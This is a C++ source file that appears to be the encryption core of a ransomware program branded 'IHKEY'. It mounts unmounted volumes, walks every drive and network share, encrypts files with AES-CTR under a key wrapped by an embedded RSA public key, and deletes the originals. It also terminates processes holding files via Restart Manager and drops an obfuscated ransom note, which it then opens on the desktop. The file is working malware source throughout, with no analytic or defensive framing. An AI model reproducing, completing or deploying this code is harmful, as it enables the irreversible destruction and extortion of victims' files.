#include "filesSystem.h"
#include "config.h"
#include "utils.h"
#include "xorstr.hpp"
#include <shlobj_core.h>







void Save(const std::string& filename, const BufferedTransformation& bt)
{
	FileSink file(filename.c_str());

	bt.CopyTo(file);
	file.MessageEnd();
}

void SaveBase64(const std::string& filename, const BufferedTransformation& bt)
{
	Base64Encoder encoder;

	bt.CopyTo(encoder);
	encoder.MessageEnd();

	Save(filename, encoder);
}

void SavePrivateKey(const std::string& filename, const PrivateKey& key)
{
	ByteQueue queue;
	key.Save(queue);

	Save(filename, queue);
}

void SavePublicKey(const std::string& filename, const PublicKey& key)
{
	ByteQueue queue;
	key.Save(queue);

	Save(filename, queue);
}

void SaveBase64PrivateKey(const std::string& filename, const PrivateKey& key)
{
	ByteQueue queue;
	key.Save(queue);

	SaveBase64(filename, queue);
}

void SaveBase64PublicKey(const std::string& filename, const PublicKey& key)
{
	ByteQueue queue;
	key.Save(queue);

	SaveBase64(filename, queue);
}

void LoadPrivateKey(const std::string& filename, PrivateKey& key)
{
	ByteQueue queue;

	Load(filename, queue);
	key.Load(queue);
}

void LoadPublicKey(const std::string& filename, PublicKey& key)
{
	ByteQueue queue;

	Load(filename, queue);
	key.Load(queue);
}

void Load(const std::string& filename, BufferedTransformation& bt)
{
	FileSource file(filename.c_str(), true /*pumpAll*/);

	file.TransferTo(bt);
	bt.MessageEnd();
}

void LoadBase64(const std::string& filename, BufferedTransformation& bt)
{
	Base64Decoder decoder;
	Load(filename, decoder);

	decoder.CopyTo(bt);
	bt.MessageEnd();
}

void LoadBase64PrivateKey(const std::string& filename, PrivateKey& key)
{
	ByteQueue queue;

	LoadBase64(filename, queue);
	key.Load(queue);
}

void LoadBase64PublicKey(const std::string& filename, PublicKey& key)
{
	ByteQueue queue;

	LoadBase64(filename, queue);
	key.Load(queue);
}

///--------------------------------------------------------------------


void LoadStringS(const std::string& PubKey, BufferedTransformation& bt)
{
	StringSource str(PubKey, true);

	str.TransferTo(bt);
	bt.MessageEnd();
}

void LoadBase64String(const std::string& PubKey, BufferedTransformation& bt)
{
	Base64Decoder decoder;
	LoadStringS(PubKey, decoder);

	decoder.CopyTo(bt);
	bt.MessageEnd();
}


void LoadBase64PublicKeyString(const std::string& PubKey, PublicKey& key)
{
	ByteQueue queue;

	LoadBase64String(PubKey, queue);
	key.Load(queue);
}



VOID MountAllVolumes()
{
	WCHAR VolumePathNames[MAX_PATH];
	const WCHAR* drives[] =
	{
		L"Q:\\",
		L"W:\\",
		L"E:\\",
		L"R:\\",
		L"T:\\",
		L"Y:\\",
		L"U:\\",
		L"I:\\",
		L"O:\\",
		L"P:\\",
		L"A:\\",
		L"S:\\",
		L"D:\\",
		L"F:\\",
		L"G:\\",
		L"H:\\",
		L"J:\\",
		L"K:\\",
		L"L:\\",
		L"Z:\\",
		L"X:\\",
		L"C:\\",
		L"V:\\",
		L"B:\\",
		L"N:\\",
		L"M:\\"
	};

	LPCWSTR lpszVolumeMountPoint[26];

	int j = 0;
	for (int i = 0; i < ARRAYSIZE(drives); ++i)
	{
		if (GetDriveTypeW(drives[i]) == DRIVE_NO_ROOT_DIR)
		{
			lpszVolumeMountPoint[j++] = drives[i];
		}
	}

	DWORD cchBufferLength = 120;
	DWORD cchReturnLength = 0;

	WCHAR* volumename = (WCHAR*)MyHeapAlloc(65536);
	if (volumename != NULL)
	{
		LPVOID unused = (LPVOID)MyHeapAlloc(65536);
		if (unused != NULL)
		{
			HANDLE hFindVolume = FindFirstVolumeW(volumename, 32768);
			do
			{
				if (!j)
				{
					break;
				}

				if (!GetVolumePathNamesForVolumeNameW(volumename, VolumePathNames, cchBufferLength, &cchReturnLength)
					|| lstrlenW(VolumePathNames) != 3)
				{
					SetVolumeMountPointW(lpszVolumeMountPoint[--j], volumename);
				}
			} while (FindNextVolumeW(hFindVolume, volumename, 32768));
			FindVolumeClose(hFindVolume);
			MyHeapFree(unused);
		}
		//std::wcout << volumename <<std::endl;
		MyHeapFree(volumename);
		
	}


}

VOID traverse_NetShares(LPNETRESOURCEW lpnr , _IHKEY_USER_KEY* UserKey)
{

	DWORD dwResult, dwResultEnum, cbBuffer = 26500, cEntries = -1;
	HANDLE hEnum = NULL;
	LPNETRESOURCEW lpnrLocal = nullptr;

	DWORD dwRequiredSize = 0;
	BOOL bConnected = TRUE;
	do
	{
		if (WNetOpenEnumW(RESOURCE_GLOBALNET,
			RESOURCETYPE_ANY, 0, lpnr, &hEnum) != NO_ERROR)
			break;

		lpnrLocal = (LPNETRESOURCEW)new BYTE[cbBuffer + 1];
		if (!lpnrLocal)
		{
			break;
		}


		dwRequiredSize = cbBuffer;

		dwResultEnum = WNetEnumResourceW(hEnum, &cEntries,
			lpnrLocal, &dwRequiredSize);

		if ((dwRequiredSize > cbBuffer) && (dwResultEnum == ERROR_MORE_DATA))
		{

			delete[]lpnrLocal;
			lpnrLocal = (LPNETRESOURCEW)new BYTE[dwRequiredSize + 1];
			if (lpnrLocal != nullptr)
			{
				cEntries = -1;
				dwResultEnum = WNetEnumResourceW(hEnum, &cEntries, lpnrLocal, &dwRequiredSize);
			}
		}

		if (dwResultEnum != NO_ERROR)
			break;

		for (UINT iIndex = 0; iIndex < cEntries; iIndex++)
		{
			if ((lpnrLocal[iIndex].dwUsage & RESOURCEUSAGE_CONTAINER) == RESOURCEUSAGE_CONTAINER)
			{

				traverse_NetShares(&lpnrLocal[iIndex] , UserKey);
			}
			else if ((lpnrLocal[iIndex].dwUsage & RESOURCETYPE_DISK) == RESOURCETYPE_DISK)
			{

				bConnected = FALSE;
				if (WNetAddConnectionW(lpnrLocal[iIndex].lpRemoteName, NULL, NULL) != ERROR_INVALID_PASSWORD)
				{
					UINT uRemoteLen = wcslen(lpnrLocal[iIndex].lpRemoteName);

					PWCHAR pwTraversePath = new WCHAR[uRemoteLen + 12];
					if (pwTraversePath)
					{
						wcscpy(pwTraversePath, lpnrLocal[iIndex].lpRemoteName);
						if (pwTraversePath[uRemoteLen - 1] != L'\\')
							wcscat(pwTraversePath, L"\\");


						SearchFilesEncryption(pwTraversePath, UserKey);
						delete[]pwTraversePath;
					}

					WNetCancelConnectionW(lpnrLocal[iIndex].lpRemoteName, FALSE);
				}
			}
		}


	} while (FALSE);

	if (lpnrLocal != nullptr)
		delete[]lpnrLocal;

	if (hEnum != NULL)
	{
		if (WNetCloseEnum(hEnum) == NO_ERROR)
		{

		}
	}


	return;
}



bool ExtensionChecker(const std::wstring& exten)
{
	bool isExenExist = false;


	if (
		exten == L".mp3"  || exten == L".eac"  || exten == L".mp4" ||
		exten == L".msi"  || exten == L".jar"  || exten == L".lib" ||
		exten == L".obj"  || exten == L".patch"|| exten == L".scs" ||
		exten == L".delta"|| exten == L".vm"   || exten == _EXT	   ||
		exten == L".dll"  || exten == L".bat"  || exten == L".ini" || 
		exten == L".exe"  || exten == L".tmp"  || exten == L".sys" ||
		exten == L".bin"  || exten == ".LOCK"  || exten == ".lock"
		)
	{
		isExenExist = true;
	}

	return isExenExist;
}



VOID SearchFilesEncryption(boost::filesystem::path const& root , _IHKEY_USER_KEY * UserKey)
{
	
	

	BOOL FlagBlack = FALSE;
	try
	{
		for (auto& itr : boost::filesystem::directory_iterator(root, directory_options::skip_permission_denied))
		{
			std::string current_dir = itr.path().relative_path().string();

			for (size_t i = 0; i < BLACKLISTED_FILENAMES.size(); i++)
			{
				if (current_dir == BLACKLISTED_FILENAMES.at(i))
				{
					FlagBlack = TRUE;
					break;
				}

			}

			if (!FlagBlack)
			{


				if (boost::filesystem::exists(itr.path()) && boost::filesystem::is_directory(itr.path()))
				{
					WriteMessageTo(itr.path().wstring(), UserKey->PublicUserKey);
					auto fs = recursive_directory_iterator(itr.path(), directory_options::skip_permission_denied);

					for (auto& entry : fs)
					{
						if (boost::filesystem::is_regular_file(entry.path()) && entry.path().filename() != _NAME)
						{
							if (!ExtensionChecker(entry.path().extension().wstring()))
							{
								//std::cout << entry.path() << std::endl;

								encryptingAES(entry.path().wstring(), UserKey);

								try
								{
									boost::filesystem::remove(entry.path());
								}
								catch (const std::exception&)
								{
									
									continue;
								}

							}

						}

					}
				}
				else
				{	//encrypt Root files
					if (boost::filesystem::is_regular_file(itr.path()) && itr.path().filename() != _NAME)
					{

						if (!ExtensionChecker(itr.path().extension().wstring()))
						{
							WriteMessageTo(itr.path().wstring(), UserKey->PublicUserKey);

							encryptingAES(itr.path().wstring(), UserKey);
							try
							{
								boost::filesystem::remove(itr.path());
							}
							catch (const std::exception&)
							{
								
								continue;
							}
						}
					}

				}

			}
		FlagBlack = FALSE;

		}

	}
	catch (const boost::filesystem::filesystem_error& e)
		{
			std::cout << e.what() << std::endl;

		}


}


inline bool EndOfFile(const CryptoPP::FileSource& file)
{
	std::istream* stream = const_cast<CryptoPP::FileSource&>(file).GetStream();
	return stream->eof();
}

VOID GeneratekeyAES(_IHKEY_USER_KEY* keys)
{



	AutoSeededRandomPool rng;
	rng.GenerateBlock(keys->KeyBin, sizeof keys->KeyBin);
	rng.GenerateBlock(keys->IvBin, sizeof keys->IvBin);


	std::string KeyHex;
	HexEncoder hexEn;
	hexEn.Put(keys->KeyBin, sizeof keys->KeyBin);
	hexEn.MessageEnd();

	word64 sizeBinKey = hexEn.MaxRetrievable();

	if (sizeBinKey)
	{
		KeyHex.resize(sizeBinKey);
		hexEn.Get((unsigned char*)&KeyHex[0], KeyHex.size());
	}
	keys->KeyHex = KeyHex;

	
	std::string IVHex;
	HexEncoder IvEncoder;
	IvEncoder.Put(keys->IvBin, sizeof keys->IvBin);
	IvEncoder.MessageEnd();

	word64 sizeBinIv = IvEncoder.MaxRetrievable();

	if (sizeBinIv)
	{
		IVHex.resize(sizeBinIv);
		IvEncoder.Get((unsigned char*)&IVHex[0], IVHex.size());
	}
	keys->IvHex = IVHex;

	

}
void hex_to_byte_key(_IHKEY_USER_KEY* keyUser) {
	
	string decoded_1;
	StringSource ss(keyUser->KeyHex, true, new HexDecoder(new StringSink(decoded_1)));

	for (int i = 0; i < KEY_LEN; i++) {
		if (decoded_1[i] < 0) keyUser->KeyBin[i] = decoded_1[i] + 256;
		else keyUser->KeyBin[i] = decoded_1[i];
	}
	
	string decoded_2;
	StringSource ss_2(keyUser->IvHex, true, new HexDecoder(new StringSink(decoded_2)));

	for (int i = 0; i < KEY_LEN; i++) {
		if (decoded_2[i] < 0) keyUser->IvBin[i] = decoded_2[i] + 256;
		else keyUser->IvBin[i] = decoded_2[i];
	}

}

static int encryptingAES(const std::wstring& path, _IHKEY_USER_KEY* UserKey)
{
	const auto out = path + _EXT;

	try
	{
		CryptoPP::CTR_Mode<CryptoPP::AES>::Encryption encryptor;
		encryptor.SetKeyWithIV(UserKey->KeyBin, sizeof UserKey->KeyBin, UserKey->IvBin);

		CryptoPP::MeterFilter meter;
		CryptoPP::StreamTransformationFilter Filter(encryptor);

		CryptoPP::FileSource Source(path.c_str(), false);
		CryptoPP::FileSink sink(out.c_str());

		Source.Attach(new CryptoPP::Redirector(Filter));
		Filter.Attach(new CryptoPP::Redirector(meter));
		meter.Attach(new CryptoPP::Redirector(sink));

		const CryptoPP::word64 BLOCK_SIZE = 4096;



		while (!EndOfFile(Source) && !Source.SourceExhausted())
		{
			Source.Pump(BLOCK_SIZE);
			Source.Flush(false);

		}

		Filter.MessageEnd();
	}
	catch (const CryptoPP::Exception& ex)
	{
		std::cerr << ex.what() << std::endl;
	}


}




static VOID RSA_Encryptor(const string& key , _IHKEY_USER_KEY *UserKey)
{
	AutoSeededRandomPool rng;
	InvertibleRSAFunction params;
	params.GenerateRandomWithKeySize(rng, 3072);

	RSA::PrivateKey privateKey(params);
	RSA::PublicKey publicKey(params);


	//try 
	//{
	//	LoadBase64PrivateKey("rsa-base64-private.key", privateKey);
	//}
	//catch (const std::exception& e)
	//{
	//	std::cout << e.what() << std::endl;
	//}
	

	try
	{
		LoadBase64PublicKeyString(_IHKEY_PUBLIC_KEY_, publicKey);

	}
	catch (const std::exception& e)
	{
		std::cout << e.what() << std::endl;
	}

	std::string encrypted_key, decrypted_key;

	RSAES_OAEP_SHA_Encryptor encryptor(publicKey);

	try
	{
		StringSource(key, true,
			new PK_EncryptorFilter(rng, encryptor,
				new StringSink(encrypted_key)
			)
		);
	}
	catch (const std::exception& e)
	{
		std::cout << e.what() << std::endl;
	}

	std::string PublicUserKey;

	StringSource(encrypted_key, true, new Base64Encoder(new StringSink(PublicUserKey)));



	UserKey->PublicUserKey = PublicUserKey;



}


VOID SessionManager(const std::wstring filename)
{
	HANDLE hFile;

	WCHAR sessionKey[CCH_RM_SESSION_KEY + 1];
	DWORD sessionHnd;
	RM_PROCESS_INFO dwProcessId[10];

	DWORD rebootReasons;
	BOOL bWhat = TRUE;

	SetFileAttributesW(filename.c_str(), FILE_ATTRIBUTE_NORMAL);
	while (TRUE)
	{
		hFile = CreateFileW(filename.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			break;
		}

		if (!bWhat)
		{
			break;
		}

		ZeroMemory(sessionKey, CCH_RM_SESSION_KEY + 1);

		if (RmStartSession(&sessionHnd, 0, sessionKey))
		{
			break;
		}

		//PCWSTR pszFile = utils::convertCharArrayToLPCWSTR(filename.c_str());

		if (!RmRegisterResources(sessionHnd, 1, (PCWSTR*)&filename, 0, NULL, 0, NULL))
		{
			UINT procInfoNeeded, procInfo = sizeof(dwProcessId);
			if (!RmGetList(sessionHnd, &procInfoNeeded, &procInfo, dwProcessId, &rebootReasons))
			{
				for (int i = 0; i < procInfo; ++i)
				{
					if (dwProcessId[i].ApplicationType != RmExplorer
						&& dwProcessId[i].ApplicationType != RmCritical
						&& GetCurrentProcessId() != dwProcessId[i].Process.dwProcessId)
					{
						HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, dwProcessId[i].Process.dwProcessId);
						if (hProcess != INVALID_HANDLE_VALUE)
						{
							TerminateProcess(hProcess, 0);
							WaitForSingleObject(hProcess, 5000);
							CloseHandle(hProcess);
						}
					}
				}
			}
		}
		RmEndSession(sessionHnd);
		bWhat = FALSE;
	}


}


VOID WriteMessageTo(const std::wstring& path ,const std::string& PublicUserKey)
{


	std::string msg = xorstr_(
		"----------------------- Your Files are encrypted BY IHKEY -----------------------"
	);


	ofstream outfile(path + L"//" + _NAME);

	outfile << msg << std::endl;
	outfile << '\n';
	outfile << std::string(xorstr_("Your Public key is important ,  save it we need it to decrypt your files ")) << std::endl;
	outfile << std::string(xorstr_("-------------------------------------- BEGIN PUBLIC KEY --------------------------------------" ))<< std::endl;
	outfile << PublicUserKey << std::endl;
	outfile << std::string(xorstr_("-------------------------------------- END PUBLIC KEY --------------------------------------")) << std::endl;

	outfile.close();
}



VOID ThreadSearchFilesEncrypting()
{
	//ASE 
	_IHKEY_USER_KEY keyUser;
	ZeroMemory(&keyUser, sizeof keyUser);

	GeneratekeyAES(&keyUser);

	//RSA
	std::string KeysWithIV = "Key : " + keyUser.KeyHex + " IV :" + keyUser.IvHex;
	RSA_Encryptor(KeysWithIV, &keyUser);


	 std::vector<std::thread> Thread;

	 Thread.emplace_back(std::thread(traverse_NetShares,nullptr,&keyUser));

	 DWORD drivemask = GetLogicalDrives();

		if (drivemask)
		{
			for (char c = 'A'; c <= 'Z'; ++c)
			{
				if ((drivemask & 1) != 0)
				{

					std::string drivestring = std::string(1 , c) + ":\\\\";

					DWORD drivetype = GetDriveTypeA(drivestring.c_str());


					if (drivetype != DRIVE_UNKNOWN && drivetype != DRIVE_CDROM)
					{
						Thread.emplace_back(std::thread(SearchFilesEncryption, drivestring, &keyUser));
					}
					
					
				}
			
				drivemask >>= 1;
			}
			
		}
		
		for (size_t i = 0; i < Thread.size(); i++)
		{
			Thread[i].join();
		}


		
		TCHAR Path[MAX_PATH];

		if (SHGetSpecialFolderPathW(HWND_DESKTOP, Path, CSIDL_DESKTOP, FALSE))
		{

			WriteMessageTo(Path, keyUser.PublicUserKey);
	
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };

			StrCatW(Path,L"\\");
			StrCatW(Path, _NAME.c_str());
			std::wstring szCmd = std::wstring((L"notepad.exe  ")).append(Path).append(L" ");


			CreateProcessW(NULL, (TCHAR*)szCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW,
				NULL, NULL, &si, &pi);

			WaitForSingleObject(pi.hProcess, INFINITE);

			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);


			
		}
		
		
		ZeroMemory(&keyUser, sizeof keyUser);
}

